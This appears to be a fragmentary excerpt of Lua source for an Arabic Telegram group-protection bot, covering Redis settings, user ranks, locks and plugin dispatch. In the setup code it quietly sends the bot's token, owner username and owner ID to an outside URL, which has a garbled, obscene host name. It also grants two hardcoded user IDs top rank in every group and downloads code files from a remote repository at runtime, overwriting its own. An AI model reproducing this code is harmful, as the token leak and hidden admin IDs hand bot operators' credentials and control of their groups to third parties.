...
dady = Token:match("(%d+)")
redis:set(dady..":VERSION",1)
redis:set(dady..":SUDO_ID:",SUDO_USER)
redis:set(dady..":DataCenter:",'German')
redis:set(dady..":UserNameBot:",BOT_User)
redis:set(dady..":NameBot:",BOT_NAME)
redis:hset(dady..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3dady_INSTALL","Yes")
info = {} 
...
https.request('https://زبي/زب جوجل/Source.dady?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./inc/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close()
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس Adryan \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
...
dady = Token:match("(%d+)")
our_id = tonumber(dady)
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(dady..":UserNameBot:")
SUDO_ID = tonumber(redis:get(dady..":SUDO_ID:"))
SUDO_USER = redis:hgetall(dady..'username:'..SUDO_ID).username
version = redis:get(dady..":VERSION")
DataCenter = redis:get(dady..":DataCenter:")
...
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..dady..')\027[0;32m\n'
...
if msg.type == "pv" and redis:get(dady..':mute_pv:'..msg.chat_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end

if redis:get(dady..'sender:'..msg.sender_user_id_..':flood') then
...
if redis:get(dady..'group:add'..msg.chat_id_) then 
...
msg.Rank = 1
elseif msg.sender_user_id_ == 1153223737 then 
msg.TheRank =  'مطور السورس'
msg.Rank = 1
elseif msg.sender_user_id_ == 1710896172 then 
msg.TheRank =  'مطور السورس'
msg.Rank = 1
...
msg.Rank = 1
elseif redis:sismember(dady..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = 'المطور '
msg.TheRank = 'مطور البوت '
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(dady..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء الاساسي'
msg.TheRank = 'المنشىء الاساسي '
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(dady..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء '
msg.TheRank = 'المنشىء '
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(dady..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المدير ' 
msg.TheRank = 'مدير البوت ' 
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(dady..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'الادمن '
msg.TheRank = 'ادمن في البوت '
msg.Rank = 6
elseif msg.GroupActive and redis:sismember(dady..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
...
local lock_bots = redis:get(dady..'lock_bots'..msg.chat_id_)
ZISBOT = false
...
if msg.GroupActive and ZISBOT and redis:get(dady..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(dady..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(dady..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(dady..':WELCOME_BOT'),[[•~مـرحبآ آنآ بوت آسـمـي ]]..redis:get(dady..':NameBot:')..[[•~آختصـآصـي حمـآيه‌‏ آلمـجمـوعآت
...
if msg.GroupActive and redis:get(dady..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
end
...
if msg.Admin then redis:srem(dady..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
...
if msg.Admin then redis:srem(dady..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
...
if redis:get(dady..'mute_text'..msg.chat_id_) then --قفل الدردشه
...
if ScriptFile and ScriptFile.dady then 
if msg.text and ScriptFile.idady then
for k, dady in pairs(ScriptFile.dady) do
local SearchText = msg.text:match(dady)
if SearchText then
if not CheckFlood(msg) then
return false 
end

local GetMsg = ScriptFile.idady(msg,{msg.text:match(dady)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",dady.." | Plugin is: \27[1;32mScript.lua\27[0m")
...
if ScriptFile.ddady then
if ScriptFile.ddady(msg) == false then
return false
end
...
if Plug.dady then 
if msg.text and Plug.idady then
for k, dady in pairs(Plug.dady) do
local SearchText = msg.text:match(dady)
if SearchText then
if not CheckFlood(msg) then
return false
...
Mohammad = msg.text
if Mohammad then
if redis:sismember(dady..'CmDlist:'..msg.chat_id_,Mohammad) then
mmdi = redis:hget(dady..'CmD:'..msg.chat_id_,Mohammad)
msg.text = Mohammad:gsub(Mohammad,mmdi)
end
end
local GetMsg = Plug.idady(msg,{msg.text:match(dady)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",dady.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
...
print("The File "..name.." Not Runing in The Source dady")
end 

end
else
print("The File Script.lua Not Runing in The Source dady")
...
function tdcli_update_callback(data)
	...
	redis:srem(dady..'users',msg.sender_user_id_)
	end
	...
	download_file('https://raw.githubusercontent.com/AhmedAdryan2/Adryan/master/inc/Run.lua','./inc/Run.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'40% - |█████       |')
	download_file('https://raw.githubusercontent.com/AhmedAdryan2/Adryan/master/inc/locks.lua','./inc/locks.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'60% - |███████     |')
	download_file('https://raw.githubusercontent.com/AhmedAdryan2/Adryan/master/inc/Script.lua','./inc/Script.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'80% - |█████████   |')
	download_file('https://raw.githubusercontent.com/AhmedAdryan2/Adryan/master/inc/functions.lua','./inc/functions.lua')
	download_file('https://raw.githubusercontent.com/AhmedAdryan2/Adryan/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
	download_file('https://raw.githubusercontent.com/AhmedAdryan2/Adryan/master/plugins/games.lua','./plugins/games.lua')
...
msg.text = Mohammad:gsub(Mohammad,mmdi)
	...
	mmd = redis:get(dady..":SUDO_ID:")
redis:hset(dady..'username:'..tonumber(mmd),'username',msg.text)
	...
	redis:set(dady..":SUDO_ID:",msg.text)
...
download(stk,32)
	...
	if redis:get(dady..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(dady..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(dady..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(dady..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(dady..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
	msg.Admin = true
	end
	local lock_bots = redis:get(dady..'lock_bots'..msg.chat_id_)
	ISBOT = false
	...
	if ZISBOT and redis:get(dady..'lock_bots_by_kick'..msg.chat_id_) then
	kick_user(msg.sender_user_id_, msg.chat_id_)
	end
...
if redis:get(dady..'lock:join:'..msg.chat_id_) then
kick_user(msg.sender_user_id_,msg.chat_id_)
	...
	if redis:get(dady..'group:add'..data.chat_.id_) then
	redis:set(dady..'group:name'..data.chat_.id_,data.chat_.title_)
	end
	...
	if redis:get(dady..'group:add-100'..data.channel_.id_) then
	local linkGroup = (redis:get(dady..'linkGroup-100'..data.channel_.id_) or "")
	local NameGroup = (redis:get(dady..'group:name-100'..data.channel_.id_) or "")
	...
	redis:mset(
	dady..'group:name'..k,IDS.Title,
	dady..'num_msg_dady'..k,5,
	dady..'group:add'..k,true,
	dady..'lock_link'..k,true,
	dady..'lock_spam'..k,true,
	dady..'lock_webpage'..k,true,
	dady..'lock_markdown'..k,true,
	dady..'lock_flood'..k,true,
	dady..'lock_bots'..k,true,
	dady..'mute_forward'..k,true,
	dady..'mute_contact'..k,true,
	dady..'mute_document'..k,true,
	dady..'mute_inline'..k,true,
	dady..'lock_username'..k,true,
	dady..'replay'..k,true
	)
	redis:sadd(dady..'group:ids',k) 

	if IDS.Admins then
	for user,ID in pairs(IDS.Admins) do
	redis:hset(dady..'username:'..ID,'username',user)
	redis:sadd(dady..'admins:'..k,ID)
	end
	end
	if IDS.Creator then
	for user,ID in pairs(IDS.Creator) do
	redis:hset(dady..'username:'..ID,'username',user)
	redis:sadd(dady..':MONSHA_BOT:'..k,ID)
	end
	end
	if IDS.Owner then
	for user,ID in pairs(IDS.Owner) do
	redis:hset(dady..'username:'..ID,'username',user)
	redis:sadd(dady..'owners:'..k,ID)
	end
	end
	end
	io.popen("rm -fr ../.telegram-cli/data/document/*")
	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'•~** تم رفع آلنسـخه‏‏ آلآحتيآطـيه\n•~** حآليآ عدد مـجمـوعآتك هيه *'..redis:scard(dady..'group:ids')..'* ®️\n✓')
	end
	elseif data.ID == "UpdateUser" then  
	if data.user_.type_.ID == "UserTypeDeleted" then
	print("¦ userTypeDeleted")
	redis:srem(dady..'users',data.user_.id_)
	elseif data.user_.type_.ID == "UserTypeGeneral" then
	local CheckUser = redis:hgetall(dady..'username:'..data.user_.id_).username
	...
	redis:hset(dady..'username:'..data.user_.id_,'username',USERNAME)
	end 
	end
